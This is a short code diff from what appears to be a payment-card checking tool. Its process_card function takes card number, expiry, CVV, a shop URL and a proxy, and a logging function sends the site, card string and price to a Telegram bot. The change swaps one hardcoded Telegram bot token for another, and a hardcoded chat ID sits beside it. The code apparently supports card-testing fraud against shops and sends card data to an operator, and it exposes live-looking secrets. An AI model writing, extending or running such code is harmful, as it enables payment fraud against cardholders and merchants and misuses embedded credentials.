@@ -1011,7 +1011,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
         return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency
 
 async def send_telegram_log_async(site, cc_string, gateway, price, currency, proxy_str):
-    token = os.getenv("TELEGRAM_BOT_TOKEN", "6695376237:AAER1O0z9xB6R5iiru0SYm3HhBvWSIz5jM0")
+    token = os.getenv("TELEGRAM_BOT_TOKEN", "6857251998:AAGz01FvGy8fk37IofiGUBLXNSPjeWDN_J4")
     chat_id = os.getenv("TELEGRAM_CHAT_ID", "1591287620")
     if not token or not chat_id:
         return
